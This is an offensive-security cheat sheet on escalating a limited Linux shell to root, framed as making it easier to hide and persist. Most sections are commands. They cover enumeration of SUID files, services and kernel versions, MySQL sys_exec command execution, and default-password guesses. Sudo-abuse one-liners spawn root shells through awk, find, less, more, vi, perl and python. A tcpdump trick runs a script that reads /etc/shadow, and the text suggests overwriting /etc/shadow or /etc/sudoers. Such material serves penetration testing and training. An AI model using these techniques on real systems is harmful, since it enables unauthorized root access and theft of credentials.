---
description: Linux weak services and misconfiguration of permissions
---

# Privilege escalation

Once we have a limited shell it is useful to escalate that shells privileges. This way it will be easier to hide, read and write any files, and persist between reboots.

In this chapter I am going to go over these common Linux privilege escalation techniques:

* Kernel exploits
* Programs running as root
* Installed software
* Weak/reused/plaintext passwords
* Inside service
* Suid misconfiguration
* Abusing sudo-rights
* World writable scripts invoked by root
* Bad path configuration
* Cronjobs
* Unmounted filesystems

### Enumeration scripts <a id="enumeration-scripts"></a>

I have used principally three scripts that are used to enumerate a machine. They are some difference between the scripts, but they output a lot of the same. So test them all out and see which one you like best.

**LinEnum**

[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

Here are the options:

```text
-k Enter keyword
-e Enter export location
-t Include thorough (lengthy) tests
-r Enter report name
-h Displays this help text
```

**Unix privesc**

[http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)  
Run the script and save the output in a file, and then grep for warning in it.

**Linprivchecker.py**+

{% embed url="https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py" %}

### Privilege Escalation Techniques <a id="privilege-escalation-techniques"></a>

#### Kernel Exploits <a id="kernel-exploits"></a>

By exploiting vulnerabilities in the Linux Kernel we can sometimes escalate our privileges. What we usually need to know to test if a kernel exploit works is the OS, architecture and kernel version.

Check the following:

OS:

Architecture:

Kernel version:

```text
uname -a
cat /proc/version
cat /etc/issue
```

**Search for exploits**

```text
site:exploit-db.com kernel version

python linprivchecker.py extended
```

Don't use kernel exploits if you can avoid it. If you use it it might crash the machine or put it in an unstable state. So kernel exploits should be the last resort. Always use a simpler priv-esc if you can. They can also produce a lot of stuff in the `sys.log`. So if you find anything good, put it up on your list and keep searching for other ways before exploiting it.

#### Programs running as root <a id="programs-running-as-root"></a>

The idea here is that if specific service is running as root and you can make that service execute commands you can execute commands as root. Look for webserver, database or anything else like that. A typical example of this is mysql, example is below.

**Check which processes are running**

```text
# Metasploit
ps

# Linux
ps aux
```

**Mysql**

If you find that mysql is running as root and you username and password to log in to the database you can issue the following commands:

```text
select sys_exec('whoami');
select sys_eval('whoami');
```

If neither of those work you can use a [User Defined Function/](https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/)

#### User Installed Software <a id="user-installed-software"></a>

Has the user installed some third party software that might be vulnerable? Check it out. If you find anything google it for exploits.

```text
# Common locations for user installed software
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```



#### Weak/reused/plaintext passwords <a id="weakreusedplaintext-passwords"></a>

* Check file where webserver connect to database \(`config.php` or similar\)
* Check databases for admin passwords that might be reused
* Check weak passwords

```text
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```

* Check plaintext password

```text
# Anything interesting the the mail?
/var/spool/mail
```

```text
./LinEnum.sh -t -k password
```



#### Service only available from inside <a id="service-only-available-from-inside"></a>

It might be that case that the user is running some service that is only available from that host. You can't connect to the service from the outside. It might be a development server, a database, or anything else. These services might be running as root, or they might have vulnerabilities in them. They might be even more vulnerable since the developer or user might be thinking "since it is only accessible for the specific user we don't need to spend that much of security".

Check the netstat and compare it with the nmap-scan you did from the outside. Do you find more services available from the inside?

```text
# Linux
netstat -anlp
netstat -ano
```



#### Suid and Guid Misconfiguration <a id="suid-and-guid-misconfiguration"></a>

When a binary with suid permission is run it is run as another user, and therefore with the other users privileges. It could be root, or just another user. If the suid-bit is set on a program that can spawn a shell or in another way be abuse we could use that to escalate our privileges.

For example, these are some programs that can be used to spawn a shell:

```text
nmap
vim
less
more
```

If these programs have suid-bit set we can use them to escalate privileges too. For more of these and how to use the see the next section about abusing sudo-rights:

```text
nano
cp
mv
find
```

**Find suid and guid files**

```text
#Find SUID
find / -perm -u=s -type f 2>/dev/null

#Find GUID
find / -perm -g=s -type f 2>/dev/null
```

Find suid bit enabled files

```text
find / -perm -4000 2>/dev/null
```

#### Abusing sudo-rights <a id="abusing-sudo-rights"></a>

If you have a limited shell that has access to some programs using `sudo` you might be able to escalate your privileges with. Any program that can write or overwrite can be used. For example, if you have sudo-rights to `cp` you can overwrite `/etc/shadow` or `/etc/sudoers` with your own malicious file.

`awk`

```text
awk 'BEGIN {system("/bin/bash")}'
```

`bash`

`cp`  
Copy and overwrite /etc/shadow

`find`

```text
sudo find / -exec bash -i \;

find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
```

`ht`

The text/binary-editor HT.

`less`

From less you can go into vi, and then into a shell.

```text
sudo less /etc/shadow
v
:shell
```

`more`

You need to run more on a file that is bigger than your screen.

```text
sudo more /home/pelle/myfile
!/bin/bash
```

`mv`

Overwrite `/etc/shadow` or `/etc/sudoers`

`man`

`nano`

`nc`

`nmap`

`python/perl/ruby/lua/etc`

```text
sudo perl
exec "/bin/bash";
ctr-d
```

```text
sudo python
import os
os.system("/bin/bash")
```

`sh`

`tcpdump`

```text
echo $'id\ncat /etc/shadow' > /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

`vi/vim`

Can be abused like this:

```text
sudo vi
:shell

:set shell=/bin/bash:shell    
:!bash
```

[How I got root with sudo/](https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/)

World writable files

```text
find / -perm -2 ! -type l -ls 2>/dev/null
```





